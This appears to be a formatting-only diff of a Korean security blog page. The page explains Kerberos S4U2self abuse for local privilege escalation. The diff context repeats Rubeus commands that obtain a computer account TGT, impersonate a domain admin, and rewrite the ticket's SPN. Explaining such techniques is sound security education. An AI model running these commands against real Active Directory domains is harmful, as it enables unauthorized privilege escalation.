@@ -24,13 +24,16 @@
 &lt;/ol&gt;
 &lt;p&gt;S4U2self&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574;&amp;#xC11C;&amp;#xB294; TGT &amp;#xB610;&amp;#xB294; &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130; &amp;#xACC4;&amp;#xC815;&amp;#xC758; &amp;#xC790;&amp;#xACA9; &amp;#xC99D;&amp;#xBA85;&amp;#xC774; &amp;#xD544;&amp;#xC694;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130; &amp;#xACC4;&amp;#xC815;&amp;#xC758; TGT&amp;#xB294; Rubues&amp;#xC758;&lt;code&gt;tgt::deleg&lt;/code&gt; trick&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xAC00;&amp;#xC838;&amp;#xC62C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs cmake&#34;&gt;Invoke-Rubeus -&lt;span class=&#34;hljs-keyword&#34;&gt;Command&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;tgtdeleg /nowrap&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;ol&gt;
+
+&lt;ol start=&#34;2&#34;&gt;
 &lt;li&gt;SPN &amp;#xC218;&amp;#xC815;&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;&amp;#xC704;&amp;#xC758; TGT&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; S4U2self&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xC5EC; &amp;#xB3C4;&amp;#xBA54;&amp;#xC778; &amp;#xAD00;&amp;#xB9AC;&amp;#xC790;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xD2F0;&amp;#xCF13;&amp;#xC744; &amp;#xC694;&amp;#xCCAD;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs cmake&#34;&gt;Invoke-Rubeus -&lt;span class=&#34;hljs-keyword&#34;&gt;Command&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;s4u /self /nowrap /impersonateuser:doadmin /ticket:base64blob&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&amp;#xAE30;&amp;#xBCF8;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; S4U2self&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xAC00;&amp;#xC838;&amp;#xC628; &amp;#xD2F0;&amp;#xCF13;&amp;#xC758; SPN&amp;#xC740; &amp;#xD574;&amp;#xCEE4;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589; &amp;#xC911;&amp;#xC778;  &lt;code&gt;Computername$&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xC124;&amp;#xC815;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC720;&amp;#xD6A8;&amp;#xD55C; SPN&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xBBC0;&amp;#xB85C; &amp;#xD2F0;&amp;#xCF13;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xC9C0;&amp;#xB9CC;, &lt;code&gt;tgssub&lt;/code&gt;&amp;#xC640; &lt;code&gt;/altservice&lt;/code&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xD574;&amp;#xB2F9; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xC218;&amp;#xC815;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs cmake&#34;&gt;Invoke-Rubeus -&lt;span class=&#34;hljs-keyword&#34;&gt;Command&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;tgssub /altservice:http/adsec-00.contoso.com /ticket:base64blob&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&amp;#xADF8; &amp;#xD6C4; &amp;#xB2E4;&amp;#xB978; &amp;#xD638;&amp;#xC2A4;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xD2F0;&amp;#xCF13;&amp;#xC744; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD574; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cyberstoph.org/img/7_tgssub_ptt_2.png&#34; alt=&#34;tgtdeleg&#34;&gt;&lt;/p&gt;
  - hack &amp; life">
@@ -51,13 +54,16 @@
 &lt;/ol&gt;
 &lt;p&gt;S4U2self&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574;&amp;#xC11C;&amp;#xB294; TGT &amp;#xB610;&amp;#xB294; &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130; &amp;#xACC4;&amp;#xC815;&amp;#xC758; &amp;#xC790;&amp;#xACA9; &amp;#xC99D;&amp;#xBA85;&amp;#xC774; &amp;#xD544;&amp;#xC694;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130; &amp;#xACC4;&amp;#xC815;&amp;#xC758; TGT&amp;#xB294; Rubues&amp;#xC758;&lt;code&gt;tgt::deleg&lt;/code&gt; trick&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xAC00;&amp;#xC838;&amp;#xC62C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs cmake&#34;&gt;Invoke-Rubeus -&lt;span class=&#34;hljs-keyword&#34;&gt;Command&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;tgtdeleg /nowrap&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;ol&gt;
+
+&lt;ol start=&#34;2&#34;&gt;
 &lt;li&gt;SPN &amp;#xC218;&amp;#xC815;&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;&amp;#xC704;&amp;#xC758; TGT&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; S4U2self&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xC5EC; &amp;#xB3C4;&amp;#xBA54;&amp;#xC778; &amp;#xAD00;&amp;#xB9AC;&amp;#xC790;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xD2F0;&amp;#xCF13;&amp;#xC744; &amp;#xC694;&amp;#xCCAD;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs cmake&#34;&gt;Invoke-Rubeus -&lt;span class=&#34;hljs-keyword&#34;&gt;Command&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;s4u /self /nowrap /impersonateuser:doadmin /ticket:base64blob&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&amp;#xAE30;&amp;#xBCF8;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; S4U2self&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xAC00;&amp;#xC838;&amp;#xC628; &amp;#xD2F0;&amp;#xCF13;&amp;#xC758; SPN&amp;#xC740; &amp;#xD574;&amp;#xCEE4;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589; &amp;#xC911;&amp;#xC778;  &lt;code&gt;Computername$&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xC124;&amp;#xC815;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC720;&amp;#xD6A8;&amp;#xD55C; SPN&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xBBC0;&amp;#xB85C; &amp;#xD2F0;&amp;#xCF13;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xC9C0;&amp;#xB9CC;, &lt;code&gt;tgssub&lt;/code&gt;&amp;#xC640; &lt;code&gt;/altservice&lt;/code&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xD574;&amp;#xB2F9; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xC218;&amp;#xC815;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs cmake&#34;&gt;Invoke-Rubeus -&lt;span class=&#34;hljs-keyword&#34;&gt;Command&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;tgssub /altservice:http/adsec-00.contoso.com /ticket:base64blob&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&amp;#xADF8; &amp;#xD6C4; &amp;#xB2E4;&amp;#xB978; &amp;#xD638;&amp;#xC2A4;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xD2F0;&amp;#xCF13;&amp;#xC744; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD574; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cyberstoph.org/img/7_tgssub_ptt_2.png&#34; alt=&#34;tgtdeleg&#34;&gt;&lt;/p&gt;
  - hack &amp; life">
@@ -291,13 +297,16 @@
 </ol>
 <p>S4U2self&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; TGT &#xB610;&#xB294; &#xCEF4;&#xD4E8;&#xD130; &#xACC4;&#xC815;&#xC758; &#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xCEF4;&#xD4E8;&#xD130; &#xACC4;&#xC815;&#xC758; TGT&#xB294; Rubues&#xC758;<code>tgt::deleg</code> trick&#xC744; &#xD1B5;&#xD574; &#xAC00;&#xC838;&#xC62C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;tgtdeleg /nowrap&quot;</span></code></pre>
-<ol>
+
+<ol start="2">
 <li>SPN &#xC218;&#xC815;</li>
 </ol>
 <p>&#xC704;&#xC758; TGT&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; S4U2self&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xB3C4;&#xBA54;&#xC778; &#xAD00;&#xB9AC;&#xC790;&#xC5D0; &#xB300;&#xD55C; &#xD2F0;&#xCF13;&#xC744; &#xC694;&#xCCAD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
 <pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;s4u /self /nowrap /impersonateuser:doadmin /ticket:base64blob&quot;</span></code></pre>
+
 <p>&#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; S4U2self&#xB97C; &#xD1B5;&#xD574; &#xAC00;&#xC838;&#xC628; &#xD2F0;&#xCF13;&#xC758; SPN&#xC740; &#xD574;&#xCEE4;&#xAC00; &#xC2E4;&#xD589; &#xC911;&#xC778;  <code>Computername$</code>&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC720;&#xD6A8;&#xD55C; SPN&#xC774; &#xC544;&#xB2C8;&#xBBC0;&#xB85C; &#xD2F0;&#xCF13;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xC9C0;&#xB9CC;, <code>tgssub</code>&#xC640; <code>/altservice</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;tgssub /altservice:http/adsec-00.contoso.com /ticket:base64blob&quot;</span></code></pre>
+
 <p>&#xADF8; &#xD6C4; &#xB2E4;&#xB978; &#xD638;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xD2F0;&#xCF13;&#xC744; &#xBCF5;&#xC0AC;&#xD574; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><img src="https://cyberstoph.org/img/7_tgssub_ptt_2.png" srcset="/img/loading.gif" alt="tgtdeleg"></p>
 
@@ -319,9 +328,9 @@
                   
                   <a class="hover-with-bg" href="/tags/lpe/">lpe</a>
                   
-                  <a class="hover-with-bg" href="/tags/idioth/">idioth</a>
-                  
                   <a class="hover-with-bg" href="/tags/kerberos/">kerberos</a>
+                  
+                  <a class="hover-with-bg" href="/tags/idioth/">idioth</a>
                   
                   <a class="hover-with-bg" href="/tags/s4u2self/">s4u2self</a>
                   
